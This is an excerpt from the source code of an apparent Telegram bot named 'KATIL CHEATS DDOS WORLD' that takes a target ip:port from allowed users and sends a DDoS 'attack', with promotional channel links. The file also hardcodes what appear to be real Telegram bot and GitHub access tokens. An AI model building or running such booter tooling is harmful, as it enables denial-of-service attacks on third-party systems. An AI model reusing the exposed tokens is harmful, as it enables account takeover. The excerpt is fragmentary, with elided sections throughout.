...
TELEGRAM_BOT_TOKEN ='8391475821:AAG-I9LJGENzSYNQ4IBC-o6ymrrCy1Xdmak'
ADMIN_USER_ID = 6144822538

# GitHub Config
GITHUB_TOKEN = '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'
REPO_OWNER = 'KATILzz1'
REPO_NAME = 'KATIL'
...
async def start(update: Update, context: CallbackContext):
    message = (
        "*🔥 KATIL CHEATS DDOS WORLD 🔥*\n\n"
        "*OFFICIAL CHANNELS:*\n"
        "🔸 @KATIL_CHEATS\n"
        "🔸 @KATIL_CHEATS\n\n"
        "*OFF CREDITS:* @PAID_SELLERz\n\n"
...
async def attack(update: Update, context: CallbackContext):
    ...
    if not await is_user_allowed(user_id):
        await update.message.reply_text("*❌ Access Denied! Join @KATIL_CHEATS*")
        return
    ...
    await update.message.reply_text(f"*⚔️ Attack Sent by KATIL CHEATS  ⚔️*\n*🎯 Target:* `{ip}:{port}`")
...
def main():
    try:
        ...
        print("🚀 KATIL CHEATS Bot is starting...")
        app.run_polling()
    except Exception as e:
